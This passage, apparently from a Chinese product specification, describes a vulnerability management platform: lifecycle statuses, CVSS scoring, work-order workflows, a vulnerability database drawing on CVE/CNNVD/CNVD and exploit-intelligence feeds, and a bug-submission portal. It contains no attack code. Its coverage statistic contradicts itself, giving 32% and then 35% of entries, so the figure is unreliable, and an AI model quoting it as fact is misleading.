title="丰富的漏洞状态"></a>丰富的漏洞状态</h6><p>有丰富的漏洞状态，这些状态可以帮助团队跟踪漏洞处理的不同阶段，确保每个漏洞都得到适当的处理和跟进。具体状态如下：</p><p>新增：漏洞被最初发现并报告，但尚未经过验证或分配给相应的团队或个人处理。</p><p>开放：漏洞已被确认并分配给负责团队，但尚未进行进一步的处理或验证。</p><p>重现：团队已经能够重现漏洞，即在特定条件下能够复现该问题。</p><p>误报：最初被报告为漏洞的问题实际上不是漏洞，可能是由于误解或其他原因而被错误地报告。</p><p>忽略：经过评估后，决定该漏洞并不会带来实际影响或风险，因此选择不予处理。</p><p>接受：确认该漏洞存在，并被接受为需要解决的问题。</p><p>缓解：已经实施了临时性的修复或措施，以减轻漏洞可能带来的影响。</p><p>消除：成功修复了漏洞，并且相应的系统或软件不再受其影响。</p><p>待修复：漏洞已被确认，但尚未进行修复操作。</p><p>修复完成：漏洞已成功修复并验证完毕。</p><p>无法修复：经过评估后认定无法直接修复该漏洞或问题。</p><p>超期未修复：设定的修复期限已过，但漏洞仍未得到处理或修复。</p><p>待验证：修复措施已经实施，但尚未进行验证以确认修复是否有效。</p><p>验证成功：经过验证确认，修复措施已成功解决漏洞。</p><p>验证失败：修复措施被验证后发现并未解决漏洞。</p><p>待复测：修复措施已经重新实施，但尚未进行再次验证。</p><p>复测通过：经过再次验证，确认修复措施已经有效。</p><p>复测失败：再次验证后发现修复措施仍然未能解决漏洞。</p><p>待处理：漏洞被发现，但尚未进行任何处理或分类。</p><h6 id="漏洞时间线管理"><a href="#漏洞时间线管理" class="headerlink" title="漏洞时间线管理"></a>漏洞时间线管理</h6><p>支持漏洞时间线管理，包括漏洞公布时间、不同来源POC公布时间、Snort IPS规则公布时间、资产发现时间、漏洞发现时间、漏洞生命周期状态的跟踪，以提炼考核指标。</p><h4 id="漏洞风险管理"><a href="#漏洞风险管理" class="headerlink" title="漏洞风险管理"></a>漏洞风险管理</h4><p>漏洞风险管理模块为漏洞管理平台提供了重要的风险评估和分析功能。它支持漏洞的CVSS评分，包括多个维度如攻击向量、攻击复杂度、权限要求、用户交互、影响范围、机密性、完整性和可用性等。这有助于全面了解漏洞的风险程度。</p><p>漏洞风险管理模块提供了风险分析功能，用户可以自动或人工对漏洞进行详细分析。分析内容包括攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害和影响、影响等级、风险等级以及修复时限要求等。通过这些分析，用户可以更好地理解漏洞对系统的潜在威胁，帮助组织制定相应的风险控制和漏洞修复策略，确保系统的安全性和可靠性。这一模块的功能完善了漏洞管理平台的风险管理能力，有助于更好地识别和处理高风险漏洞。</p><h5 id="功能实施方案-6"><a href="#功能实施方案-6" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>平台支持全面的漏洞CVSS评分系统，该系统通过多维度的评估为每个漏洞提供一个标准化的严重性评分。这包括考量攻击向量，即漏洞被利用的环境；攻击复杂度，即攻击实现的难度；权限要求，即攻击成功所需的权限水平；用户交互，即用户参与程度；以及漏洞对系统的机密性、完整性和可用性的影响。这些因素共同作用，形成一个综合评分，指导安全团队制定修复策略。</li><li>平台提供的风险分析功能结合自动化工具和专家知识，全面自动评估漏洞风险，同时支持人工分析的流程。分析内容涵盖攻击路径及其编号，以便跟踪潜在的利用途径；攻击可行性等级，判断漏洞被利用的可能性；以及漏洞可能造成的具体危害和影响，包括对业务影响的等级划分。此外，分析结果还将推导出针对不同风险等级的修复时限建议，帮助安全团队优先处理最紧急的威胁。</li><li>通过漏洞风险评估报表支持安全团队快速识别和排序漏洞修复的优先级。报表详细展示每个漏洞的风险等级、描述、受影响资产等关键信息，使得安全决策更加数据驱动。优先级排序基于漏洞的重要性，确保关键资源被分配到对业务连续性和数据保护影响最大的漏洞上。</li></ol><h5 id="技术实现内容-4"><a href="#技术实现内容-4" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="漏洞CVSS评分"><a href="#漏洞CVSS评分" class="headerlink" title="漏洞CVSS评分"></a>漏洞CVSS评分</h6><p>平台支持对漏洞进行CVSS评分，该评分包括多个方面，如攻击向量、攻击复杂度、权限要求、用户交互、影响范围、机密性、完整性和可用性等。这有助于明确漏洞的严重程度。</p><p>攻击向量（Attack Vector）： 用于评估攻击者是否可以远程或本地利用漏洞。这个指标表示攻击者进入和接近目标的方式。</p><p>攻击复杂度（Attack Complexity）： 用于评估利用漏洞的复杂程度。这个指标考虑攻击者利用漏洞所需的条件，例如特定环境、特定配置或特定用户交互等。</p><p>权限要求（Privileges Required）： 衡量攻击者利用漏洞所需的权限级别，从不需要特殊权限到需要完全控制系统等级别。</p><p>用户交互（User Interaction）： 评估攻击者利用漏洞所需的用户参与程度，例如是否需要用户交互行为才能利用漏洞。</p><p>影响范围（Scope）： 评估成功利用漏洞后对其他系统、组件或资源的影响程度。</p><p>机密性（Confidentiality）： 衡量成功利用漏洞对数据机密性的影响程度。</p><p>完整性（Integrity）： 评估成功利用漏洞对数据完整性的影响程度。</p><p>可用性（Availability）： 衡量成功利用漏洞对系统或资源可用性的影响程度。</p><h6 id="风险分析功能"><a href="#风险分析功能" class="headerlink" title="风险分析功能"></a>风险分析功能</h6><p>平台提供风险分析功能，可以自动或人工分析漏洞的风险。分析内容包括攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害和影响、影响等级、风险等级以及修复时限要求。这有助于用户更好地理解漏洞可能带来的威胁。</p><p>平台提供漏洞风险评估报表，可根据漏洞重要性对漏洞修复的优先级进行排序，报表内容漏洞信息展示，不限于漏洞风险等级、漏洞信息、漏洞关联资产。</p><p>风险分析功能。这项功能涵盖了攻击路径及路径编号、攻击可行性等级、漏洞可能造成的危害及影响、影响等级、风险等级以及修复时限要求等内容。这样的分析有助于全面评估漏洞可能性和影响，并根据风险等级确定漏洞修复的紧急性，确保系统安全性和稳定性。</p><p>漏洞风险评估报表能够根据漏洞的重要性对修复优先级进行排序。报表内容主要包括漏洞信息展示，其中包括但不限于漏洞风险等级、漏洞信息和漏洞关联资产等要素。</p><p>这份报表可以清晰地展示各个漏洞的风险评级，帮助管理员和安全团队根据漏洞的重要性和对系统的潜在威胁程度进行优先级排序。同时，报表内容会呈现漏洞的详细信息，包括其影响程度、相关资产以及可能产生的潜在危害，为漏洞修复提供全面参考依据。</p><p>这种漏洞风险评估报表的生成，为安全团队提供了清晰的视图，帮助他们有效地确定漏洞修复的优先级，以及采取相应的安全措施来保障系统的安全性。</p><h4 id="工单管理"><a href="#工单管理" class="headerlink" title="工单管理"></a>工单管理</h4><p>工单管理模块为漏洞管理平台提供了全面的工作流程和任务协调功能。用户可以创建不同类型的工单，包括验证漏洞工单、修复漏洞工单、复测漏洞工单以及人工渗透工单。这些工单类型允许用户验证漏洞修复措施，进行漏洞修复预验证以及实施效果验证等操作。</p><p>工单管理还支持工单的审核，包括审核状态的管理，如未审核、待审核、审核通过和审核不通过。用户可以根据工单状态进行操作，包括待派单、待接单、已拒单、进行中、已完成和已关闭。</p><p>工单可以进行多种操作，如派单、接单、转单、拒单、申请延期、删除等。工单内容中的漏洞数据可根据数据权限进行判断，以确保信息的安全性。</p><p>工单管理模块还支持与现有工单系统的联动，以实现协同处理。此外，用户可以通过站内消息推送和邮件推送进行多角色、多用户之间的实时沟通和协作。</p><p>可以导出漏洞数据，包括全部资产的漏洞数据、条件搜索后的漏洞数据以及指定勾选的漏洞数据。用户可以自定义配置要导出的漏洞属性，并对导出的漏洞属性进行排序。还可以生成工单信息的报告，支持自定义报告模板，包括自定义logo、单位名称、页眉和页脚信息，以及对报告中的漏洞级别、数量、情报来源等进行过滤和筛选。</p><p>报告可以导出为Word和PDF格式，方便用户进行分享和归档。</p><h5 id="功能实施方案-7"><a href="#功能实施方案-7" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>平台为用户提供了创建不同类型工单的能力，以适应不同阶段的漏洞管理需求。这些工单类型包括验证漏洞工单，用于确认漏洞的存在性；修复漏洞工单，记录和跟踪漏洞的修复措施；复测漏洞工单，确保已实施的修复措施有效；以及人工渗透工单，进行更深层次的安全检查。此外，系统支持对漏洞修复措施进行预验证和效果验证，从而保证修复措施的正确实施和有效性。</p><p>平台提供了全面的工单审核机制，确保工单处理的准确性和合规性。工单的审核状态分为四类：未审核（新提交的工单等待初步审查），待审核（工单已经被标记为需要审核，等待审批人的确认），审核通过（工单已经被审查并认为符合标准，准备执行），以及审核不通过（工单存在问题，需要提交者进行修改后重新提交）。</p><p>平台支持对工单状态进行自动和手动的修改，以适应不同的工作流程和管理需求。工单状态的种类包括待派单（工单创建后等待指派给相应的处理人员），待接单（工单已派发但尚未被接受），已拒单（工单被指派人员拒绝，需要重新派发），进行中（工单正在被处理），已完成（工单处理完毕），以及已关闭（工单已归档，不再活跃）。</p><p>工单系统支持多种操作，包括派单（分配工单给特定的处理人员），接单（处理人员接受工单开始处理），转单（将工单转给其他处理人员），拒单（处理人员因故无法接受工单），申请延期（请求更多时间来完成工单），以及删除工单（在适当情况下清除工单）。</p><p>工单系统内置了细粒度的数据权限管理，确保工单中的敏感信息只对授权用户可见。这样的权限控制机制有助于防止数据泄露，加强安全性。</p><p>需要上传漏洞数据文件时，系统提供了快捷的方式，允许用户直接将漏洞信息加入到相关工单中，这样可以更加方便地管理和跟踪漏洞处理过程。</p><p>平台支持与现有的工单系统进行联动，实现数据共享和工作流程的协同处理，有助于提高团队的工作效率和响应速度。</p><p>为了促进团队成员之间的有效沟通，平台提供了系统内部多角色、多用户之间的站内消息推送和邮件推送功能。这样可以确保信息的及时传达和团队成员之间的协作。</p><p>用户可以轻松导出全部资产的漏洞数据，或者根据特定条件进行搜索后导出相关的漏洞数据。此外，用户还可以选择性地导出勾选的特定漏洞数据，以满足不同的分析和报告需求。</p><p>平台的导出功能非常灵活，支持用户自定义配置要导出的漏洞属性。这样用户可以根据自己的需要选择性地导出特定的数据字段。</p><p>在导出数据时，用户可以通过系统提供的用户界面或者API，选择排序字段（如选择漏洞编号进行排序），并指定升序或降序排列，同时可以在表格标题处单击排序按钮触发排序功能，以便创建更加有序和便于阅读的报告。</p><p>平台内置了多种报告模板，供用户选择合适的报告模版，并允许用户自定义报告的logo、单位名称、页眉页脚等信息，以便创建符合组织身份和品牌形象的专业报告。</p><p>报告生成模块提供了强大的过滤功能，用户可以根据漏洞级别、数量、情报来源等条件筛选数据，从而生成更加精准和有针对性的报告。</p><p>工单信息的导出支持word和PDF格式，方便用户根据不同的场景选择最合适的文档格式进行分享或打印。</p><h5 id="技术实现内容-5"><a href="#技术实现内容-5" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="多类型工单管理"><a href="#多类型工单管理" class="headerlink" title="多类型工单管理"></a>多类型工单管理</h6><p>支持创建不同类型的工单，包括验证漏洞工单、修复漏洞工单、复测漏洞工单、人工渗透工单。可对漏洞修复措施进行验证，同时支持漏洞修复预验证和实施效果验证措施等。这有助于明确每个工单的目的和流程。</p><p>系统支持创建多种工单类型，分别包括验证漏洞工单、修复漏洞工单、复测漏洞工单以及人工渗透工单。这些工单针对漏洞管理过程中的不同阶段，允许对漏洞修复措施进行验证。验证漏洞工单用于确认漏洞的存在与否，修复漏洞工单用于跟踪和管理漏洞修复进程，复测漏洞工单用于再次测试修复效果，而人工渗透工单则用于安排和记录人工渗透测试的过程。</p><p>这些工单类型支持对漏洞修复措施的验证。系统可以进行漏洞修复前的预验证，确保计划的修复方案有效。此外，系统还能提供修复效果验证措施，以确认漏洞修复方案的实际效果和系统安全性的提升。</p><p>这种多类型工单管理系统有助于安全团队规划和追踪漏洞修复过程，确保漏洞得到有效处理，系统安全性得到提升。</p><h6 id="工单审核"><a href="#工单审核" class="headerlink" title="工单审核"></a>工单审核</h6><p>提供工单审核功能，工单状态包括未审核、待审核、审核通过和审核不通过。这确保了每个工单都经过必要的审查和批准。</p><p>系统支持工单的审核过程，其中包含四种状态：未审核、待审核、审核通过和审核不通过。</p><p>未审核状态表示工单尚未经过审核；待审核状态表示工单已提交但还未被审核人员处理；审核通过状态表示工单已通过审核并可进入下一步流程；审核不通过状态表示工单未能通过审核，可能需要进行修改后重新提交。</p><h6 id="工单状态管理"><a href="#工单状态管理" class="headerlink" title="工单状态管理"></a>工单状态管理</h6><p>工单可以根据进展的情况自动或手动修改状态。状态包括待派单、待接单、已拒单、进行中、已完成和已关闭，以确保工单跟踪。</p><p>系统支持工单状态的自动和手动修改，包括以下状态：待派单、待接单、已拒单、进行中、已完成和已关闭。</p><p>待派单状态表示工单已创建但尚未被分配或派发给具体处理人员。</p><p>待接单状态指工单已派发给处理人员，等待其接受任务。</p><p>已拒单状态表示处理人员拒绝接受该工单任务。</p><p>进行中状态表示工单正在被处理人员处理中。</p><p>已完成状态表示工单任务已被处理人员完成。</p><p>已关闭状态表示工单处理流程结束，已不再需要进一步处理或跟进。</p><h6 id="工单操作"><a href="#工单操作" class="headerlink" title="工单操作"></a>工单操作</h6><p>支持多种工单操作，包括派单、接单、转单、拒单、申请延期、删除等，以便及时处理漏洞和工单。</p><p>派单：指将工单指派给相应的处理人员或团队，让其负责处理任务。</p><p>接单：处理人员或团队接受任务并开始执行相关操作。</p><p>转单：将工单从一个处理人员或团队转移给另一个人员或团队，通常是由于需要更适合的人员来处理。</p><p>拒单：指处理人员或团队拒绝接受任务，可能是由于资源不足或无法处理的原因。</p><p>申请延期：处理人员或团队申请将工单的完成时间推迟至更晚的时间点。</p><p>删除：删除不再需要处理或已经完成的工单。</p><h6 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h6><p>工单内容中的漏洞可以根据用户的数据权限进行判断，以确保敏感信息的保密性，避免信息泄露。</p><p>数据权限控制能够确保只有获得相应权限的用户或角色能够查看或处理特定漏洞的详细信息。系统会根据用户或角色的权限设置，在工单内容中对单个漏洞的显示进行限制，以保护敏感信息不被未经授权的人员查看或获取。</p><p>这种数据权限控制机制有助于防止敏感信息泄露，保护漏洞等重要安全数据的安全性和保密性，同时确保合适的人员能够获得必要的信息进行工单处理。</p><h6 id="漏洞数据集成"><a href="#漏洞数据集成" class="headerlink" title="漏洞数据集成"></a>漏洞数据集成</h6><p>允许在上传漏洞数据文件时，将漏洞直接加入工单，简化了漏洞处理过程。</p><p>协同处理：支持与现有工单系统的联动，以协同处理和跟踪漏洞的解决。</p><p>这种功能使得用户能够直接通过上传漏洞数据文件的方式将漏洞信息快速添加到工单中。系统可以自动识别和解析上传的文件，将其中的漏洞信息提取出来，并根据用户需求，将这些漏洞信息直接关联到相应的工单中，为后续的处理和跟进提供更为便捷的方式。</p><p>这样的操作简化了漏洞信息加入工单的流程，提高了工作效率，让用户能够更加快速地处理和管理相关漏洞。</p><h6 id="消息通知"><a href="#消息通知" class="headerlink" title="消息通知"></a>消息通知</h6><p>提供系统内部多角色和多用户之间的站内消息推送和邮件推送，以确保及时的通信和协作。</p><p>通过站内消息推送，不同角色和用户能够在系统内部进行消息沟通、交流和通知，无需依赖外部通讯工具。这种消息推送可以提高内部沟通的效率和便捷性，让团队成员更方便地分享信息、讨论问题和协同工作。</p><p>同时，系统支持邮件推送功能，能够通过电子邮件向不同用户发送相关通知、提醒或重要信息。邮件推送是一种可靠的通知方式，使用户能够及时了解到重要的系统更新、任务通知或其他相关信息。</p><p>这两种推送方式的结合，能够满足用户在系统内外进行即时、有效的信息沟通和交流的需求。</p><h6 id="导出功能"><a href="#导出功能" class="headerlink" title="导出功能"></a>导出功能</h6><p>可以导出所有资产的漏洞数据，根据条件搜索后的漏洞数据，或者指定勾选的漏洞数据，并且对导出的漏洞属性可以进行排序以满足不同的报告需求。</p><p>用户可以根据需求选择导出全部资产的漏洞数据，或者根据条件搜索后得到的结果进行导出，也可以勾选特定的漏洞数据进行导出。这种灵活的导出功能允许用户将漏洞数据以可下载的格式导出，例如Excel或CSV文件，以便于进一步分析、备份或与其他系统进行数据交互。</p><p>这种导出功能提供了灵活性和便利性，让用户能够根据具体需求获取特定范围的漏洞数据，进一步利用这些数据做进一步的分析和管理。</p><h6 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h6><p>提供自定义配置选项，允许用户选择要导出的漏洞属性，并支持对导出的漏洞属性进行排序，以满足个性化的需求。</p><p>这项功能允许用户根据需要自定义选择要在导出文件中包含的漏洞属性。用户可以根据具体的需求，选择性地包括漏洞编号、漏洞描述、漏洞等级 等属性信息，并将这些属性列入导出文件中。</p><p>这种自定义配置功能提供了灵活性，让用户根据自己的工作流程和需求，定制导出文件中包含的漏洞属性，使得导出数据更符合用户的管理和分析需求。</p><h6 id="报告模板"><a href="#报告模板" class="headerlink" title="报告模板"></a>报告模板</h6><p>内置报告模板，允许对报告模板的logo、单位名称、页眉页脚信息进行自定义，以生成符合要求的工单报告。</p><p>用户能够根据实际需要，对报告模板进行个性化定制。用户可以自行上传公司或组织的logo图标，设置单位名称，以及编辑页眉和页脚等内容，以确保生成的报告符合公司的品牌形象和标准格式要求。</p><p>这种自定义功能使用户能够创建符合自身需求和品牌标识的报告模板，从而提升报告的专业性和个性化水平。</p><h6 id="漏洞过滤"><a href="#漏洞过滤" class="headerlink" title="漏洞过滤"></a>漏洞过滤</h6><p>支持对报告中的漏洞级别、数量、情报来源等进行过滤筛选，以便更好地理解漏洞情况。</p><p>导出格式：</p><p>支持将工单信息导出为Word和PDF格式，以满足不同报告和沟通的需求。</p><p>用户可以根据需求，在生成报告之前设置筛选条件，例如按照特定漏洞级别（如高、中、低）等进行过滤。这样的操作能够让用户生成满足特定条件的报告，筛选展示符合用户关注或需求的漏洞信息。</p><p>这种过滤筛选功能有助于用户根据具体需求，生成精准、专业的报告，从而更有效地传达漏洞信息及安全状况，帮助用户做出更明智的安全决策。</p><h4 id="构建漏洞库"><a href="#构建漏洞库" class="headerlink" title="构建漏洞库"></a>构建漏洞库</h4><p>构建漏洞库模块为漏洞管理平台提供了强大的漏洞数据管理和分析能力。通过统计分析引擎、关联分析引擎、知识提取引擎和任务调度引擎，可以从底层的漏洞数据安全运营平台获取漏洞共享与分析的数据。</p><p>漏洞库支持多方面的漏洞数据管理，包括漏洞提报、研判、认定和处置等能力。它专注于不同领域的漏洞，如车辆零部件、无线电、APP、云端平台等，实现了漏洞的持续归档和长期留存。</p><p>漏洞库可兼容多个漏洞库，如CVE、CNNVD、CNVD等，以确保漏洞库的全面覆盖。漏洞信息可以整合为一条，提高了数据的可读性和维护效率。</p><p>漏洞库整合了漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，漏洞情报条目数量庞大。漏洞库支持与利用情报的自动关联分析，提供了丰富的关联情报数据。</p><p>漏洞库支持漏洞的自动导出功能，导出信息包括漏洞关联资产信息（包括零部件名称、型号、版本）、漏洞版本、危害和影响等重要信息。</p><h5 id="功能实施方案-8"><a href="#功能实施方案-8" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>平台通过高级统计分析引擎、关联分析引擎、知识提取引擎以及任务调度引擎，对底层数据进行深入挖掘和智能分析。这些引擎合作提供了一个全面的漏洞共享与分析服务，允许用户从海量数据中提取有价值的信息，以及识别和关联潜在的安全威胁。通过这种方式，平台可以帮助用户更好地理解漏洞的本质，预测安全趋势，并制定有效的防御措施。</li><li>平台提供了一套完整的漏洞管理流程，包括漏洞提报、研判、认定和处置等环节。这些管理能力不仅适用于车辆零部件、无线电、APP、云端平台等多个领域漏洞库，还能实现对漏洞信息的持续化归档和长期留存。用户可以在一个集中的位置访问和管理所有漏洞数据，从而优化安全管理流程并提高响应效率。</li><li>平台的漏洞库支持与多个国内外知名的漏洞库（如CVE、CNNVD、CNVD等）兼容，确保提供全面覆盖的漏洞信息。这种兼容性使得用户能够在全球范围内追踪和识别安全漏洞，保持安全防护的及时性和有效性。</li><li>平台支持将多个来源的漏洞信息（如CVE、CNNVD、CNVD等）整合为单一条目，简化了信息管理，并使得用户可以更快捷地获取完整的漏洞数据。这种整合减少了冗余信息，提高了数据的可用性和操作效率。</li><li>平台支持接入全球权威的漏洞利用情报源，包括ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，提供的漏洞情报条目超过14万条。这种丰富的情报源帮助用户了解漏洞的利用方法和攻击者的行为模式，增强了安全防御的深度和广度。漏洞库支持与利用情报自动关联分析，漏洞库关联情报数为32%，即在14万漏洞库条目中有，有35%的漏洞是关联情报的；</li><li>漏洞库与利用情报的自动关联分析功能结合安全运营人员的手动关联确保了至少32%的漏洞条目与相关情报相关联。在14万个漏洞条目中，至少有35%的漏洞是有详细的关联情报的，从而为用户提供了更多关于漏洞可能被利用的上下文信息。</li><li>平台支持用户通过自动导出功能获取漏洞相关的详细信息，包括但不限于漏洞关联的资产信息（如零部件名称、型号、版本）、漏洞版本、危害级别及影响范围等。这些信息的导出有助于用户快速生成报告，进行风险评估和修复计划的制定。</li><li>平台提供了与第三方漏洞库（如CNVD、CNNVD）数据对接的能力，并支持在线和离线更新方式。用户可以根据自己的需求设置自动更新频率，如每周、每月等，同时支持安全运营人员的手动导入，确保重大漏洞信息能够及时更新，从而维持安全防护的连续性和时效性。</li><li>用户可以对漏洞条目进行个性化编辑，包括对漏洞名称、等级、类型、描述、修复建议、CVSS评分向量、风险值以及参考信息等进行修改和补充。这种自定义编辑功能提供了灵活性，允许用户根据自身的安全政策和实际情况，优化漏洞信息的准确性和实用性。</li></ol><h5 id="技术实现内容-6"><a href="#技术实现内容-6" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="数据源与引擎"><a href="#数据源与引擎" class="headerlink" title="数据源与引擎"></a>数据源与引擎</h6><p>支持通过统计分析引擎、关联分析引擎、知识提取引擎和任务调度引擎，从底层漏洞数据安全运营平台共享漏洞数据，以便进一步的分析和处理。</p><p>这些引擎功能能够从漏洞数据安全运营平台中提取数据，并进行统计分析、关联分析等操作，以提供漏洞共享和深度分析的能力。通过这些引擎，系统能够对漏洞数据进行有效整合、分析和挖掘，从而生成有价值的信息用于安全决策和风险评估。</p><p>这种功能能够帮助安全团队更好地利用漏洞数据，从底层平台提取相关信息并进行多维度分析，以提高安全性和降低风险。</p><h6 id="漏洞信息管理"><a href="#漏洞信息管理" class="headerlink" title="漏洞信息管理"></a>漏洞信息管理</h6><p>提供漏洞的提报、研判、认定和处置等管理能力，可针对不同方面的漏洞库，如车辆零部件、无线电、APP、云端平台等，实现漏洞的持续归档和长期留存。</p><p>系统支持提供漏洞提报、研判、认定和处置等管理功能，针对车辆零部件、无线电等方面。用户能够通过系统快捷地获取与车型和车辆态势相关的资产信息。这包括特定车型或车辆的状态、运行情况、相关风险等重要资产信息的直观展示和查看。</p><h6 id="漏洞库兼容性"><a href="#漏洞库兼容性" class="headerlink" title="漏洞库兼容性"></a>漏洞库兼容性</h6><p>支持与通用漏洞标识符（CVE）、国家信息安全漏洞共享平台（CNNVD）、中国国家信息安全漏洞库（CNVD）等漏洞库兼容，以确保漏洞库的全面覆盖。</p><p>系统支持兼容CVE、CNNVD、CNVD等漏洞库，确保漏洞库信息的全面覆盖。用户可以依赖系统与广泛使用的漏洞库进行对接，获取及时的漏洞信息，为车辆零部件和无线电等方面的漏洞管理提供全面的支持和依据。</p><h6 id="漏洞信息整合"><a href="#漏洞信息整合" class="headerlink" title="漏洞信息整合"></a>漏洞信息整合</h6><p>支持将漏洞信息从不同漏洞库来源整合为一条，以提供更清晰和一致的漏洞信息。</p><p>整合功能允许系统将同一漏洞在不同漏洞数据库中的标识符（如CVE、CNNVD、CNVD等）整合为一条信息进行展示。这样的操作能够帮助用户更清晰地查看并理解特定漏洞的多个来源信息，使漏洞信息更加简洁和易于管理。</p><p>通过整合不同来源的漏洞信息，系统能够提供更为全面和一致的视图，方便用户快速了解特定漏洞的相关内容和风险程度，有助于更高效地进行安全漏洞管理和处置。</p><h6 id="漏洞利用情报"><a href="#漏洞利用情报" class="headerlink" title="漏洞利用情报"></a>漏洞利用情报</h6><p>提供漏洞利用情报，情报来源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，漏洞情报条目数量超过14万条。</p><p>系统整合了来自多个权威渠道的漏洞利用情报，提供了庞大且多样化的漏洞信息库。这些信息涵盖了各种漏洞的详细情报，包括漏洞利用脚本、攻击模块、安全漏洞描述等内容，漏洞情报条目数量超过14万条。用户可以从这些权威来源获取有关漏洞利用的详尽信息，用于分析安全威胁、评估风险，并采取相应的安全防护措施。</p><p>这种功能的支持有助于提高对漏洞利用情报的获取和利用，帮助安全团队更好地了解威胁情报，加强系统的安全防御能力。</p><h6 id="漏洞库关联分析"><a href="#漏洞库关联分析" class="headerlink" title="漏洞库关联分析"></a>漏洞库关联分析</h6><p>漏洞库支持与利用情报自动关联分析，确保至少有32%的漏洞与关联情报相关联，即在14万漏洞库条目中有，有35%的漏洞是关联情报的，以提供更全面的漏洞信息。</p><p>关联分析能力允许系统自动检测并关联与漏洞库中漏洞相关的利用情报来源，从而为用户提供更为全面和有针对性的漏洞信息。这些关联的情报可以包括已知的攻击模块、利用脚本、漏洞利用工具等方面的信息，帮助用户更深入地理解漏洞的危害性和风险等级。</p><p>这种自动关联分析功能有助于提高漏洞库的价值和实用性，帮助用户更快速地识别并处理相关漏洞，从而提升系统的安全性。</p><h6 id="漏洞自动导出"><a href="#漏洞自动导出" class="headerlink" title="漏洞自动导出"></a>漏洞自动导出</h6><p>支持自动导出漏洞信息，导出的信息包括漏洞关联资产信息（包括零部件名称、型号、版本）、漏洞版本、危害和影响等关键信息。</p><p>用户可以自动导出与漏洞相关联的资产信息，包括零部件的具体名称、版本等细节，以及漏洞的版本信息、危害程度和影响范围等关键信息。导出的数据可以进一步用于分析和评估漏洞的风险，并指导相应的安全措施和修复计划。</p><p>这种自动导出功能能够帮助用户更高效地整理和利用漏洞关联的资产信息，为安全团队提供全面的视图，以便更好地管理漏洞和采取相应的安全措施。</p><h6 id="对接第三方平台"><a href="#对接第三方平台" class="headerlink" title="对接第三方平台"></a>对接第三方平台</h6><p>支持对接第三方漏洞库（CNVD、CNNVD）数据，支持在线更新和离线更新方式，更新频率可自定义，可自动设置按周、月等，重大漏洞信息及时更新。</p><p>系统可以与第三方漏洞库进行连接，并根据用户设定的时间表自动更新数据。系统能够获取最新的漏洞信息，包括重大漏洞的及时更新，保持数据的准确性和完整性。</p><p>这种对接和更新功能有助于系统保持漏洞信息的更新和完整性，帮助用户及时了解到最新的重大漏洞信息，为安全团队提供必要的信息支持，以便及时采取相应的安全措施。</p><h6 id="对漏洞条目自定义编辑"><a href="#对漏洞条目自定义编辑" class="headerlink" title="对漏洞条目自定义编辑"></a>对漏洞条目自定义编辑</h6><p>允许用户对漏洞条目进行自定义编辑，可以对包括：漏洞名称、等级、类型、漏洞描述、漏洞修复建议、CVSS向量和风险值、参考信息进行修改和完善。</p><p>这项功能使用户能够根据特定需求或内部环境，对漏洞条目进行修改和完善。用户可以编辑漏洞的重要属性，例如漏洞名称、等级（严重程度）、类型、详细描述、修复建议、CVSS向量和风险值等，以及提供相关参考信息。这样的操作能够帮助用户更准确地描述漏洞情况、评估风险，并提供更准确的修复建议。</p><p>用户自定义编辑漏洞条目的功能，有助于适应不同环境和需求，提高漏洞管理的灵活性和适用性，使用户能够更好地应对特定安全挑战和需求。</p><h3 id="漏洞提交平台（SRC）"><a href="#漏洞提交平台（SRC）" class="headerlink" title="漏洞提交平台（SRC）"></a>漏洞提交平台（SRC）</h3><h4 id="功能实施方案-9"><a href="#功能实施方案-9" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>为了确保安全测试和漏洞提交过程的安全与合规性，平台采取了一系列严格的措施。首先，实名认证流程确保了所有参与者的身份得到验证，这有助于建立一个可信赖的环境。此外，平台制定了详尽的线上协议和行为规范，明确了安全测试和漏洞提交的正确流程，以及参与者应遵守的规则。这些措施共同作用，能够为用户提供一个安全的平台，同时也保护了平台和用户的合法权益。</li><li>平台的漏洞运营团队对于白帽子提交的漏洞保持高度警觉，确保能够在第一时间内进行响应和审核。这种快速反应机制不仅能够加速漏洞的修复进程，还能够提高白帽子的积极性，因为他们可以确信自己的努力会被迅速而严肃地对待。平台的这一做法有助于建立起一个高效、互动的漏洞报告生态系统。</li><li>为了激励和奖励白帽子对漏洞的发现和报告，平台提供了内部接口给运营部门，使其能够发布各种不同的漏洞奖励计划。这些奖励计划包括但不限于名人堂入选、白帽赏金奖励以及参与众测比赛的机会。这些奖励测试不仅体现了平台对白帽子工作的认可，也鼓励了更多的安全研究者参与到安全维护的工作中来。</li><li>用户可以根据自己的安全需求，通过平台的功能向白帽子发送需求评估文档以及授权评估函。这一流程的设计旨在促进用户与白帽子之间的沟通和合作，确保安全测试的合法性和目标的明确性。用户通过这种方式明确授权白帽子进行安全评估，而白帽子则能够在明确授权的范围内进行专业的安全测试，这样的合作模式既保障了测试的合法性，也提高了测试的效率和有效性。</li></ol><p>漏洞提交平台（SRC）为安全测试和漏洞提交提供了多重功能和保障措施，主要是提供一个公开、透明的渠道让安全研究人员能够提交他们发现的漏洞并获取奖励。同时，提供大量漏洞信息分享，帮助人员深入学习。主要包含以下功能特点：</p><p>多种安全认证方式：平台支持多种安全认证方式，包括实名认证、平台线上协议、行为规范等，以确保安全测试和漏洞提交的合法性和安全性。</p><p>快速漏洞审核：平台的漏洞运营人员会在白帽子提交漏洞后第一时间进行审核和响应，确保漏洞得到及时处理和评估。</p><p>奖励计划发布：平台提供内部接口，供运营部门发布各种不同的漏洞奖励计划。这些计划包括名人堂、白帽赏金、众测比赛等，以鼓励白帽子积极参与漏洞发现和报告。</p><p>需求评估与授权：用户可以根据其安全需求，通过平台向白帽子发送需求评估文档与授权评估函。这有助于明确每个测试的要求、时间、测试范围和测试行为等规定，以确保测试的有效性和符合用户的需求。